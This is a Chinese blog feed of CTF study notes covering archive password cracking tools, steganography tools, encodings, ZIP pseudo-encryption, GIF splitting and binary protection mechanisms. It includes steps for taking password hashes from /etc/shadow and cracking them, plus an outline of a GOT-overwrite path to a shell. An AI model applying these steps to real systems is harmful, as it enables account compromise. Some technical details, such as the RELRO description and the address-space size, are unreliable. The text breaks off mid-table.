    
    
    <entry>
      <title>压缩包密码爆破</title>
      <link href="/2023/03d36e35d8.html"/>
      <url>/2023/03d36e35d8.html</url>
      
        <content type="html"><![CDATA[<h2 id="John-the-Ripper"><a href="#John-the-Ripper" class="headerlink" title="John the Ripper"></a>John the Ripper</h2><blockquote><p>一款常用的密码破解工具，可以用于暴力破解各种类型的加密密码</p></blockquote><ul><li><p>下载安装：<br>  <code>sudo apt-get install john</code></p></li><li><p>使用步骤：</p><ol><li>准备哈希文件<ul><li>使用 John 破解密码需要先获得<strong>目标系统的哈希文件</strong>。在 Linux 系统中，可以通过 <code>/etc/shadow</code> 文件获取哈希文件</li></ul></li><li>准备字典文件<ul><li>字典文件是用于猜测密码的文本文件，其中包含常见的单词、名字、生日等信息，可以自己制作，也可以网上下载</li></ul></li><li>运行 John<ul><li><code>john --wordlist=&lt;字典文件路径&gt; &lt;哈希文件路径&gt;</code></li><li>“–wordlist” 选项指定了要使用的字典文件，哈希文件路径为目标系统的哈希文件路径</li></ul></li></ol></li></ul><hr><h2 id="fcrackzip"><a href="#fcrackzip" class="headerlink" title="fcrackzip"></a>fcrackzip</h2><blockquote><p>fcrackzip 是一个用于暴力破解 ZIP 文件密码的命令行工具</p></blockquote><ul><li><p>下载安装：<br>  <code>sudo apt-get install fcrackzip</code></p></li><li><p>用法：<br>  <code>fcrackzip -b -c &#39;aA1!&#39; -l 1-10 -u &lt;zip文件名&gt;</code></p></li></ul><table><thead><tr><th align="left">参数</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">-b</td><td align="left">代表 暴力破解</td></tr><tr><td align="left">-c</td><td align="left">指定使用的字符集</td></tr><tr><td align="left">-l</td><td align="left">限制密码长度</td></tr></tbody></table><hr><h2 id="rarcrack"><a href="#rarcrack" class="headerlink" title="rarcrack"></a>rarcrack</h2><blockquote><p>rarcrack 是一个用于暴力破解 RAR 文件密码的命令行工具</p></blockquote><ul><li><p>下载安装：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> rarcrack<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libxml2-dev</code></pre></li><li><p>用法：<br>  <code>rarcrack &lt;文件名&gt; --threads &lt;线程数&gt; --type &lt;rar/zip/7z&gt;</code></p></li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF笔记 </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>隐写</title>
      <link href="/2023/03ed5c339a.html"/>
      <url>/2023/03ed5c339a.html</url>
      
        <content type="html"><![CDATA[<h2 id="图像隐写"><a href="#图像隐写" class="headerlink" title="图像隐写"></a>图像隐写</h2><h3 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h3><blockquote><p>分析文件里面包含的隐藏文件</p></blockquote><ul><li><code>binwalk &lt;文件名&gt;</code><br>  可直接扫描，通过扫描能够发现目标文件中包含的所有可识别的文件类型  </li><li><code>binwalk -e &lt;文件名&gt;</code><br>  扫描，-e（extract）自动提取出已知的文件类型</li></ul><hr><h3 id="zsteg"><a href="#zsteg" class="headerlink" title="zsteg"></a>zsteg</h3><blockquote><p>检测 png 和 bmp 图片里的隐写数据</p><p>安装：<code>sudo gem install zsteg</code></p></blockquote><ul><li><code>zsteg &lt;文件名&gt;</code><br>  查看 LSB 分析结果</li><li><code>zsteg &lt;文件名&gt; --all</code><br>  快速提取所有隐藏信息</li><li><code>zsteg -e &quot;偏移地址&quot; &lt;源文件名&gt; &gt; &lt;提取文件的文件名&gt;</code><br>  从某个文件的偏移地址处提取出隐藏文件</li></ul><hr><h3 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h3><blockquote><p>文件分离</p></blockquote><ul><li><code>foremost &lt;文件名&gt;</code><ol><li>会形成一个 output 文件夹，里面存放的是分离出来的文件</li><li>如果已经知道文件中包含了一个其他的文件类型，通过 <code>binwalk</code> 得到偏移地址，<mark>可以直接在 <code>WinHex</code> 中定位到该偏移地址，然后将文件的内容直接复制到一个新建的文件中，即可得到包含的文件</mark></li></ol></li></ul><hr><h3 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h3><blockquote><p>打印文件中可打印字符串</p></blockquote><ul><li><code>strings &lt;文件名&gt;</code><br>  将文件中包含的可打印字符串输出出来（有点类似于 IDA 里的 shift + F12 查看字符串）</li><li><code>strings &lt;文件名&gt; | grep flag</code><br>  仅输出文件中包含 “flag” 的字符串</li></ul><hr><h3 id="Stegsolve"><a href="#Stegsolve" class="headerlink" title="Stegsolve"></a>Stegsolve</h3><blockquote><p>一个 jar 包，轻量级的图片隐写工具（首先需安装好 java 环境）</p></blockquote><ul><li>下载地址：<a href="http://www.caesum.com/handbook/Stegsolve.jar">Stegsolve.jar（win&#x2F;linux）</a></li><li>安装 <a href="https://www.oracle.com/java/technologies/downloads/#java8-windows">java jdk</a>环境，用 <code>java -version</code> 验证安装是否成功</li><li>打开运行：<br>  <code>java -jar &lt;Stegsolve.jar 所在路径&gt;</code></li></ul><hr><h2 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h2><h3 id="Audacity"><a href="#Audacity" class="headerlink" title="Audacity"></a>Audacity</h3><blockquote><p>Audacity 是一款音频编辑软件，可以查看音频的频率、波谱等，有时候会隐藏信息</p><p>音频分析软件 Audacity 下载地址：<a href="https://www.audacityteam.org/">Audacity ® | Free</a></p></blockquote><hr><h3 id="DeepSound"><a href="#DeepSound" class="headerlink" title="DeepSound"></a>DeepSound</h3><blockquote><p>DeepSound 是一种隐写术工具，可以将隐藏的消息或文件嵌入到音频中</p><p>音频隐写软件 DeepSound 下载地址：<a href="http://www.jpinsoft.net/deepsound/download.aspx">DeepSound -&gt; Download</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF笔记 </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>各种加密算法</title>
      <link href="/2023/03b67da940.html"/>
      <url>/2023/03b67da940.html</url>
      
        <content type="html"><![CDATA[<h2 id="Base-家族"><a href="#Base-家族" class="headerlink" title="Base 家族"></a>Base 家族</h2><blockquote><p><strong>不同的 Base 系列编码主要区别在于：编码所用到的字符数量不同</strong></p></blockquote><hr><h3 id="自动化工具（BaseCrack）"><a href="#自动化工具（BaseCrack）" class="headerlink" title="自动化工具（BaseCrack）"></a>自动化工具（BaseCrack）</h3><blockquote><p>在 <code>BaseCrack</code> 的帮助下，可以自动识别出 Base 系列的加密，并且还可以一次性对任意模式下的多重 Base 编码数据进行解码</p><p>BaseCrack 下载地址：<a href="https://github.com/mufeedvh/basecrack">basecrack</a><br>安装依赖文件：<code>pip3 install -r requirements.txt</code><br>运行：<code>python basecrack.py</code></p></blockquote><hr><h3 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h3><blockquote><p>64 &#x3D; $2 ^ {6}$，每 6bit 为一个单元， 使用 <code>64 个 ASCii 可打印字符</code>（字母 A-Z、字母 a-z、数字 0-9 和 ‘+’、’&#x2F;‘）</p></blockquote><ul><li>码表：<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code> （另外，<code>&#39;=&#39;</code> 用作填充）</li><li><strong>经过 Base64 编码后的字符串长度一定会被4整除（长度包括后缀等号）</strong></li><li>由于 8bit 数据按照 6bit 切分不一定整除，末尾可能会出现 1 或 2 个  <code>&#39;=&#39;</code>，但 <code>&#39;=&#39;</code> 不超过两个</li></ul><hr><h3 id="Base16"><a href="#Base16" class="headerlink" title="Base16"></a>Base16</h3><blockquote><p>16 &#x3D; $2 ^ {4}$，每 4bit 为一个单元，使用 <code>16 个 ASCii 可打印字符</code>（字母 A-F、数字 0-9）</p></blockquote><ul><li>由于 8bit 数据按照 4bit 切分刚好是 2 组，所以 Base16 不可能用到填充符号 <code>&#39;=&#39;</code></li></ul><hr><h3 id="Base32"><a href="#Base32" class="headerlink" title="Base32"></a>Base32</h3><blockquote><p>32 &#x3D; $2 ^ {5}$，每 5bit 为一个单元，使用 <code>32 个 ASCii 可打印字符</code>（字母 A-Z、数字 2-7）</p></blockquote><hr><h3 id="base36"><a href="#base36" class="headerlink" title="base36"></a>base36</h3><blockquote><p>使用 <code>36 个 ASCii 可打印字符</code>（数字 0-9，26 个字母：A-Z 或 a-z）</p></blockquote><ul><li>加密仅支持整数数字，解密仅支持字符串，不支持中文</li></ul><hr><h3 id="Base58"><a href="#Base58" class="headerlink" title="Base58"></a>Base58</h3><blockquote><p>使用 <code>58 个 ASCii 可打印字符</code>（Base64 除去数字 <code>&#39;0&#39;</code>，大写字母 <code>&#39;O&#39;</code>、<code>&#39;I&#39;</code>，小写字母 <code>&#39;l&#39;</code>，和 <code>&#39;+&#39;</code>、 <code>&#39;/&#39;</code>）</p></blockquote><hr><h3 id="Base62"><a href="#Base62" class="headerlink" title="Base62"></a>Base62</h3><blockquote><p>使用 <code>62 个 ASCii 可打印字符</code>（数字 0-9、字母 A-Z 和字母 a-z）</p></blockquote><hr><h3 id="Base91"><a href="#Base91" class="headerlink" title="Base91"></a>Base91</h3><blockquote><p>使用 <code>91 个 ASCii 可打印字符</code>，从 ASCii 字符（0x21 - 0x7E）中除 <code>-</code>（0x2D）、<code>\</code>（0x5C）、<code>&#39;</code>（0x27）外的其他 91 个可打印字符组成</p></blockquote><hr><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><blockquote><p>MD5 值是 <code>32位</code> 由数字 0-9，字母 a-f 组成的字符串（<code>也有可能是 16 位</code>）</p></blockquote><ul><li>MD5 散列结果是 128bit 固定长度的二进制数据，然后将每 4 个二进制数据转化为 1 个十六进制数据，因此，128 位二进制数据转化为 32 个十六进制数据（128 &#x2F; 4 &#x3D; 32），最终以字符串形式呈现</li></ul><hr><h2 id="URL-编码"><a href="#URL-编码" class="headerlink" title="URL 编码"></a>URL 编码</h2><blockquote><p>URL 编码中只允许包含英文字母、数字、4 个特殊字符：<code>- _ . ~</code> 和所有的保留字符：<code>！ * ’ ( ) ; : @ &amp; = + $ , / ? # [ ]</code></p></blockquote><ul><li>URL 编码后的字符串中含有一些特殊的字符，比如 <code>&#39;%&#39;</code>、<code>&#39;+&#39;</code> 等，</li></ul><hr><h2 id="Brainfuck"><a href="#Brainfuck" class="headerlink" title="Brainfuck"></a>Brainfuck</h2><blockquote><p>Brainfuck 是一种极简单的编程语言，它只包含 8 个命令字符，并且没有任何高级语言的概念，比如函数、变量等</p></blockquote><table><thead><tr><th align="left">字符</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><code>&gt;</code></td><td align="left">移动指针到向右一个内存单元</td></tr><tr><td align="left"><code>&lt;</code></td><td align="left">移动指针到向左一个内存单元</td></tr><tr><td align="left"><code>+</code></td><td align="left">将当前内存单元加 1</td></tr><tr><td align="left"><code>-</code></td><td align="left">将当前内存单元减 1</td></tr><tr><td align="left"><code>.</code></td><td align="left">输出当前内存单元的值</td></tr><tr><td align="left"><code>,</code></td><td align="left">从输入读入一个字符，并将其赋值给当前内存单元</td></tr><tr><td align="left"><code>[</code></td><td align="left">如果当前内存单元的值为 0，则跳转到对应的 <code>]</code> 之后</td></tr><tr><td align="left"><code>]</code></td><td align="left">如果当前内存单元的值不为 0，则跳转到对应的 <code>[</code> 之前</td></tr></tbody></table><ul><li>用 <code>&#39;&gt;&#39;</code>、<code>&#39;&lt;&#39;</code>、<code>&#39;+&#39;</code>、<code>&#39;-&#39;</code>、<code>&#39;.&#39;</code>、<code>&#39;,&#39;</code>、<code>&#39;[&#39;</code>、<code>&#39;]&#39;</code> 八种符号组成</li><li>例如：<br>  明文 Hello World!，加密后密文为：<code>++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]&gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++.&gt;.+++.------.--------.&gt;+.&gt;.</code></li></ul><hr><h2 id="Ook"><a href="#Ook" class="headerlink" title="Ook!"></a>Ook!</h2><blockquote><p>Ook! 是 Brainfuck 的一种变体，它同样只包含 8 个命令字符，但是两两成对，每对命令字符组成一个 “Ook” 单元</p></blockquote><table><thead><tr><th align="left">符号</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><code>Ook? Ook.</code></td><td align="left">移动指针到向右一个内存单元</td></tr><tr><td align="left"><code>Ook. Ook?</code></td><td align="left">移动指针到向左一个内存单元</td></tr><tr><td align="left"><code>Ook. Ook.</code></td><td align="left">将当前内存单元加 1</td></tr><tr><td align="left"><code>Ook! Ook!</code></td><td align="left">将当前内存单元减 1</td></tr><tr><td align="left"><code>Ook! Ook.</code></td><td align="left">输出当前内存单元的值</td></tr><tr><td align="left"><code>Ook. Ook!</code></td><td align="left">从输入读入一个字符，并将其赋值给当前内存单元</td></tr><tr><td align="left"><code>Ook! Ook?</code></td><td align="left">如果当前内存单元的值为 0，则跳转到对应的 <code>Ook? Ook!</code> 之后</td></tr><tr><td align="left"><code>Ook? Ook!</code></td><td align="left">如果当前内存单元的值不为 0，则跳转到对应的 <code>Ook! Ook?</code> 之前</td></tr></tbody></table><ul><li>Ook! 和 Brainfuck 的主要区别在于其命令字符是成对出现的，以及 Ook! 的输出是单个字符，而不是 ASCii 码</li><li>特点是字符串中存在很多 <code>&#39;.&#39;</code>、<code>&#39;!&#39;</code>、<code>&#39;?&#39;</code> 符号</li></ul><hr><h2 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h2><blockquote><p>凯撒密码一般适用于 26 个英文字母，根据对字符串中的字符进行移位来实现加密</p><p>例如，当偏移量为 3 时，A 被替换成 D，B 被替换成 E，Z 被替换成 C</p></blockquote><hr><h2 id="Rabbit"><a href="#Rabbit" class="headerlink" title="Rabbit"></a>Rabbit</h2><blockquote><p>Rabbit 加密开头部分通常为：<code>U2FsdGVkX1</code></p></blockquote><ul><li>明显密文里​​ <code>&#39;+&#39;</code> 比较多，并且经常有 <code>&#39;/&#39;</code></li><li>例如：<br>  明文 “I Love You 521”，无密钥，加密后密文为：<strong>U2FsdGVkX1</strong>9DvuEo5PvBA8TuLrM2t+EZBvUkzlAa<br>  明文 “I Love You 521”，密钥为 666，加密后密文为：<strong>U2FsdGVkX1</strong>8w6vxXxux&#x2F;ivRVwo3xMzTxmUyk7cHz</li></ul><hr><h2 id="兽语编码"><a href="#兽语编码" class="headerlink" title="兽语编码"></a>兽语编码</h2><blockquote><p>用动物的拟声词或语气词作为加密内容</p></blockquote><ul><li>例如：<br>  明文 “我喜欢你”，加密后密文为：<del>呜嗷呜啊嗷</del>嗷<del>呜嗷啊呜啊啊<del>嗷</del>啊呜嗷</del>嗷<del>呜嗷嗷</del>嗷呜嗷~~啊</li></ul><hr><h2 id="摩斯密码"><a href="#摩斯密码" class="headerlink" title="摩斯密码"></a>摩斯密码</h2><blockquote><p>摩斯密码使用点 <code>&#39;.&#39;</code> 和划线 <code>&#39;-&#39;</code> 两种符号表示摩斯电码中的点和线</p></blockquote><ul><li>有时会出现在杂项的音频隐写中，一般在波谱中，用较宽的代表 <code>&#39;-&#39;</code>，用较窄的代表 <code>&#39;.&#39;</code>，而中间的间隔代表 <code>&#39;/&#39;</code></li></ul><p><img src="https://s2.loli.net/2023/03/28/sQmZdYy8Fz61hWb.png" alt="各种加密方法的特点_摩斯密码1.png"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF笔记 </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZIP伪加密</title>
      <link href="/2023/03ce09e570.html"/>
      <url>/2023/03ce09e570.html</url>
      
        <content type="html"><![CDATA[<h2 id="ZIP-伪加密原理"><a href="#ZIP-伪加密原理" class="headerlink" title="ZIP 伪加密原理"></a>ZIP 伪加密原理</h2><blockquote><p>zip伪加密是在文件头的加密标志位做修改，进而再打开文件时被识别为加密压缩包</p></blockquote><hr><h2 id="自动化识别工具"><a href="#自动化识别工具" class="headerlink" title="自动化识别工具"></a>自动化识别工具</h2><h3 id="ZipCenOp"><a href="#ZipCenOp" class="headerlink" title="ZipCenOp"></a>ZipCenOp</h3><blockquote><p>ZipCenOp 是一个 jar 包，用于操作 zip 格式的压缩文件，还支持对 zip 文件进行密码保护，也可以用于识别 zip 文件是否是伪加密</p><p>下载安装：<a href="https://github.com/442048209as/ZipCenOp/releases/tag/1.0">Release 1.0 · 442048209as&#x2F;ZipCenOp</a></p></blockquote><ul><li>使用：<br>  <code>java -jar ZipCenOp.jar r &lt;zip 文件名&gt;</code></li></ul><hr><h3 id="WinRAR"><a href="#WinRAR" class="headerlink" title="WinRAR"></a>WinRAR</h3><blockquote><p>一个解压软件，随缘吧，不一定行</p></blockquote><ul><li>进入 “工具”，修复压缩文件</li></ul><hr><h2 id="ZIP-文件的结构"><a href="#ZIP-文件的结构" class="headerlink" title="ZIP 文件的结构"></a>ZIP 文件的结构</h2><blockquote><p>一个 ZIP 文件由三个部分组成</p></blockquote><h3 id="数据区"><a href="#数据区" class="headerlink" title="数据区"></a>数据区</h3><p><mark>50 4B 03 04：这是头文件标记（0x04034b50）</mark><br>14 00：解压文件所需 pkware 版本<br><mark>09 00：全局方式位标记（有无加密）</mark><br>08 00：压缩方式<br>50 A3：最后修改文件时间<br>A5 4A：最后修改文件日期<br>21 38 76 64：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>08 00：文件名长度<br>00 00：扩展记录长度</p><h3 id="目录区"><a href="#目录区" class="headerlink" title="目录区"></a>目录区</h3><p><mark>50 4B 01 02：目录中文件文件头标记(0x02014b50)</mark><br>1F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br><mark>09 00：全局方式位标记（有无加密，<em><strong>更改这里进行伪加密</strong></em>，改为09 00打开就会提示有密码了）</mark><br>08 00：压缩方式<br>50 A3：最后修改文件时间<br>A5 4A：最后修改文件日期<br>21 38 76 65：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>08 00：文件名长度<br>24 00：扩展字段长度<br>00 00：文件注释长度<br>00 00：磁盘开始号<br>00 00：内部文件属性<br>20 00 00 00：外部文件属性<br>00 00 00 00：局部头部偏移量</p><h3 id="目录结束标志"><a href="#目录结束标志" class="headerlink" title="目录结束标志"></a>目录结束标志</h3><p><mark>50 4B 05 06：目录结束标记</mark><br>00 00：当前磁盘编号<br>00 00：目录区开始磁盘编号<br>01 00：本磁盘上纪录总数<br>01 00：目录区中纪录总数<br>5A 00 00 00：目录区尺寸大小<br>3F 00 00 00：目录区对第一张磁盘的偏移量<br>00 00 00：ZIP 文件注释长度</p><hr><h2 id="无加密"><a href="#无加密" class="headerlink" title="无加密"></a>无加密</h2><table><thead><tr><th>区域</th><th>参数</th></tr></thead><tbody><tr><td>数据区的全局加密</td><td>00 00</td></tr><tr><td>目录区的全局方式位标记</td><td>00 00</td></tr></tbody></table><hr><h2 id="伪加密"><a href="#伪加密" class="headerlink" title="伪加密"></a>伪加密</h2><table><thead><tr><th>区域</th><th>参数</th></tr></thead><tbody><tr><td>数据区的全局加密</td><td>00 00</td></tr><tr><td>目录区的全局方式位标记</td><td>09 00</td></tr></tbody></table><hr><h2 id="真加密"><a href="#真加密" class="headerlink" title="真加密"></a>真加密</h2><table><thead><tr><th>区域</th><th>参数</th></tr></thead><tbody><tr><td>数据区的全局加密</td><td>09 00</td></tr><tr><td>目录区的全局方式位标记</td><td>09 00</td></tr></tbody></table><hr><h2 id="加密与解密"><a href="#加密与解密" class="headerlink" title="加密与解密"></a>加密与解密</h2><table><thead><tr><th>加解密</th><th>方法</th></tr></thead><tbody><tr><td>去除密码</td><td><mark><strong>压缩源文件目录区 的 全局方式位标记 的 01 00 或 09 00 改为 00 00</strong></mark></td></tr><tr><td>添加密码提示</td><td>压缩源文件目录区 的 全局方式位标记 的 00 00 改为 01 00 或 09 00</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF笔记 </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GIF图片拆分&amp;拼图</title>
      <link href="/2023/033b385585.html"/>
      <url>/2023/033b385585.html</url>
      
        <content type="html"><![CDATA[<h2 id="Windows-平台"><a href="#Windows-平台" class="headerlink" title="Windows 平台"></a>Windows 平台</h2><h3 id="拆分并拼图"><a href="#拆分并拼图" class="headerlink" title="拆分并拼图"></a>拆分并拼图</h3><blockquote><p>将 GIF 拆分成一帧一帧的片段，并直接将这些片段拼起来在网站上展示一整张图</p></blockquote><ul><li>在线网站：<a href="https://tu.sioe.cn/gj/fenjie/">GIF动态图片分解，多帧动态图分解成多张静态图片</a></li></ul><hr><h3 id="拆分"><a href="#拆分" class="headerlink" title="拆分"></a>拆分</h3><blockquote><p>将 GIF 拆分成一帧一帧的单独文件，可打包下载到本地，但没有拼图的功能</p></blockquote><ul><li>在线网站：<a href="https://uutool.cn/gif2img/">在线GIF图片帧拆分工具 - UU在线工具</a></li></ul><hr><h3 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h3><blockquote><p>配合 <a href="https://uutool.cn/gif2img/">在线GIF图片帧拆分工具 - UU在线工具</a> 使用，先将 GIF 拆分成一个个文件，并置于同一文件夹内，然后使用 ImageMagick 进行拼接</p></blockquote><ul><li>下载：<a href="https://imagemagick.org/script/download.php#windows">图像魔术 – 下载</a></li><li>使用：<ol><li>到需要拼接的图片目录下，调用 <code>cmd</code></li><li>执行命令：<br> <code>magick montage *.png -tile &lt;1x10&gt; -geometry +0+0 flag.png</code> </li><li><strong>注意</strong>：只需修改 <code>&lt;1x10&gt;</code> 的位置 【1x10 表示将该文件夹下的图片拼成一行、每行十张，拼接得到一张大图】</li><li>这里的 <code>-geometry +0+0</code> 表示各个图片之间不需要间隔</li></ol></li></ul><hr><h2 id="Linux-平台"><a href="#Linux-平台" class="headerlink" title="Linux 平台"></a>Linux 平台</h2><h3 id="convert"><a href="#convert" class="headerlink" title="convert"></a>convert</h3><blockquote><p>在 Linux 下，convert 是一款基于 ImageMagick 软件的命令行工具，用于进行图像格式转换、大小调整、旋转、剪切、添加边框、改变图像色彩等操作</p></blockquote><ul><li>使用：<br>  <code>convert &lt;.gif 文件名&gt; &lt;输出路径/flag.png&gt;</code></li></ul><hr><h3 id="montage"><a href="#montage" class="headerlink" title="montage"></a>montage</h3><blockquote><p>在 Linux 下，montage 是基于 ImageMagick 工具集的一个命令行工具，用于将多张图片合成为一张大图</p></blockquote><ul><li>下载安装：<br>  <code>sudo apt-get install graphicsmagick-imagemagick-compat</code></li><li>使用：<ol><li>到需要拼接的图片目录下，打开终端</li><li>执行命令：<br> <code>montage *.png -tile &lt;1x10&gt; -geometry +0+0 flag.png</code></li><li><strong>注意</strong>：只需修改 <code>&lt;1x10&gt;</code> 的位置 【1x10 表示将该文件夹下的图片拼成一行、每行十张，拼接得到一张大图】</li><li>这里的 <code>-geometry +0+0</code> 表示各个图片之间不需要间隔</li></ol></li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF笔记 </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件保护机制</title>
      <link href="/2023/033e575724.html"/>
      <url>/2023/033e575724.html</url>
      
        <content type="html"><![CDATA[<h2 id="文件信息"><a href="#文件信息" class="headerlink" title="文件信息"></a>文件信息</h2><h3 id="查看类型"><a href="#查看类型" class="headerlink" title="查看类型"></a>查看类型</h3><blockquote><p><code>file &lt;文件名&gt;</code></p></blockquote><p><img src="https://s2.loli.net/2023/03/17/7lQIL4sMZbPWdxY.png" alt="CTF - Pwn_文件保护机制1.png"></p><h3 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h3><blockquote><p><strong>Kali：</strong><code>checksec &lt;文件名&gt;</code><br><strong>Ubuntu：</strong><code>checksec --file=&lt;文件名&gt;</code></p></blockquote><p><img src="https://s2.loli.net/2023/03/17/kWEDwX8tOBRQCsZ.png" alt="CTF - Pwn_文件保护机制2.png"></p><hr><h2 id="文件保护机制"><a href="#文件保护机制" class="headerlink" title="文件保护机制"></a>文件保护机制</h2><h3 id="Arch（程序架构信息）"><a href="#Arch（程序架构信息）" class="headerlink" title="Arch（程序架构信息）"></a>Arch（程序架构信息）</h3><blockquote><p>判断文件是 64位 还是 32位，exp 编写是 p64 还是 p32</p></blockquote><blockquote><p><mark>32位</mark>：cpu 一次处理 32位 数据，即 4 字节，相当于地址的宽度，即 <code>sizeof(*p)</code>，虚拟地址大小为 4G，即有 $2^{32}$ 个地址，从 32个0 到 32个1 的地址</p><p><mark>64位</mark>：cpu 一次处理 64位 数据，即 8 字节，相当于地址的宽度，即 <code>sizeof(*p)</code>，虚拟地址大小为 128G，即 $2^{64}$ 个地址，从 64个0 到 64个1 的地址</p></blockquote><h4 id="32-位和-64-位的数据处理"><a href="#32-位和-64-位的数据处理" class="headerlink" title="32 位和 64 位的数据处理"></a>32 位和 64 位的数据处理</h4><ol><li><code>p32()</code> 是对 32 位程序的数据进行打包，转换成二进制的形式，比如转换成地址</li><li><code>p64()</code> 是对 64 位程序的数据进行打包， 处理后形成<strong>小端序</strong>字节码</li><li><code>p32</code>、<code>p64</code> 是打包为二进制；<code>u32</code>、<code>u64</code> 是解包为二进制</li></ol><h4 id="32-位和-64-位的函数调用"><a href="#32-位和-64-位的函数调用" class="headerlink" title="32 位和 64 位的函数调用"></a>32 位和 64 位的函数调用</h4><ul><li><mark>32位</mark> 程序默认调用函数的方式<ol><li>将参数压入栈中</li><li>靠近 call 指令的是第一个参数</li><li>然后 call</li></ol></li><li><mark>64位</mark> 程序默认调用函数的方式<ol><li>RDI 中存放第1个参数</li><li>RSI 中存放第2个参数</li><li>RDX 中存放第3个参数</li><li>RCX 中存放第4个参数</li><li>R8 中存放第5个参数</li><li>R9 中存放第6个参数</li><li>如果还有更多的参数，再把过多那几个参数像32位程序一样压入栈中</li><li>然后call</li></ol></li></ul><hr><h3 id="RELRO（堆栈地址随机化）"><a href="#RELRO（堆栈地址随机化）" class="headerlink" title="RELRO（堆栈地址随机化）"></a>RELRO（堆栈地址随机化）</h3><blockquote><p>用于加强对 binary 数据段的保护的技术</p></blockquote><ul><li>主要针对 GOT 改写的攻击方式：<ol><li><code>Partial RELRO（部分开启，GOT 可写）</code>，易受到攻击，例如攻击者可以 atoi.got 为 system.plt，进而输入&#x2F;bin&#x2F;sh\x00获得shell</li><li><code>Full RELRO（全部开启，GOT 不可写）</code>，使整个 GOT 只读，从而无法被覆盖，意味着无法修改 GOT表。但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号</li></ol></li></ul><hr><h3 id="Stack（Canary-金丝雀）"><a href="#Stack（Canary-金丝雀）" class="headerlink" title="Stack（Canary 金丝雀）"></a>Stack（Canary 金丝雀）</h3><blockquote><p>栈溢出检查，一种用来防护栈溢出的保护机制</p><p><code>Canary found</code> 表示开启了 Canary 保护，不能直接用溢出的方法覆盖栈中返回地址</p></blockquote><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><ol><li>函数每一次执行时，在栈上随机产生一个 Canary 值</li><li>代码一般在函数的入口处，先从 fs&#x2F;gs 寄存器中取出一个4字节（eax）或者8字节（rax）的值存到栈上，逆向题中的代码经常遇见</li><li>当函数结束时，会检查这个栈上的值是否和存进去的值一致；如果不一致，就会停止程序运行，作用相当于校验信息的 cookie</li></ol><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><ul><li>一般在覆盖返回地址的时候也会将 Canary 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行。可有通过改写指针与局部变量、leak canary、overwrite canary 的方法来绕过</li></ul><hr><h3 id="NX（栈不可执行）"><a href="#NX（栈不可执行）" class="headerlink" title="NX（栈不可执行）"></a>NX（栈不可执行）</h3><blockquote><p>如果这个保护开启，就意味着栈中数据没有执行权限，程序将数据段和代码段分开了，因此不能将返回地址导向 shellcode 中</p></blockquote><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><ol><li>NX 将数据所在内存页标识为不可执行，当程序溢出成功转入 shellcode 时，程序会尝试在数据页面上执行指令，此时 CPU 就会抛出异常，而不是去执行恶意指令</li><li>当在堆栈上写入 shellcode 并触发时，只会直接造成程序的崩溃，而不是执行 shellcode</li></ol><h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h4><ul><li>一般可以利用 rop 的方式绕过</li></ul><hr><h3 id="PIE（位置无关可执行文件）"><a href="#PIE（位置无关可执行文件）" class="headerlink" title="PIE（位置无关可执行文件）"></a>PIE（位置无关可执行文件）</h3><blockquote><p>PIE 在编译时将程序编译为位置无关，程序运行的各个段加载的虚拟地址在装载时确定（地址随机化）</p></blockquote><hr><h3 id="RWX（读写权限）"><a href="#RWX（读写权限）" class="headerlink" title="RWX（读写权限）"></a>RWX（读写权限）</h3><table><thead><tr><th align="left">权限</th><th align="left">解释</th></tr></thead><tbody><tr><td align="left"><strong>r（Read，读取）</strong></td><td align="left">对文件而言，具有读取文件内容的权限；对目录来说，具有浏览目录的权限</td></tr><tr><td 